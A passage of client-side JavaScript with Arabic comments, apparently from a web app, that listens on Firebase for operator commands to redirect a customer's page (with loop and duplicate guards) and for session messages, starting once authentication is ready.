    // الجديدة نفس إشارة التوجيه المتبقية في قاعدة البيانات فيتكرر التوجيه بلا نهاية.
    cmdRef.child('redirect').on('value', (snap) => {
      const cmd = snap.val();
      if (!cmd || cmd.action !== 'REDIRECT_PAGE' || !cmd.targetPage) return;
      const target = String(cmd.targetPage);
      // لا توجّه العميل إلى الصفحة التي هو عليها أصلاً (حماية إضافية من الحلقة)
      if (target === currentPageFile() || target === window.location.pathname) {
        clearCmd('redirect');
        return;
      }
      if (alreadyDone('redirect', cmd)) { clearCmd('redirect'); return; }
      if (window.__redirectHandled) return;
      window.__redirectHandled = true;
      markDone('redirect', cmd);
      clearCmd('redirect');
      if (typeof callbacks.onRedirect === 'function') {
        callbacks.onRedirect(cmd);
      } else {
        window.location.href = target;
      }
    });

    rtd.ref('messages/' + sessionId).on('child_added', (snap) => {
      const msg = snap.val();
      if (msg && typeof callbacks.onMessage === 'function') callbacks.onMessage(msg);
    });
  };

  // ابدأ الجلسة بعد التأكد من المصادقة (قواعد أمان Firestore تتطلب تسجيل دخول للكتابة في customers)
  window.ensureAuthReady().then(function () {
    window.initFirebaseSession();
  });
})();
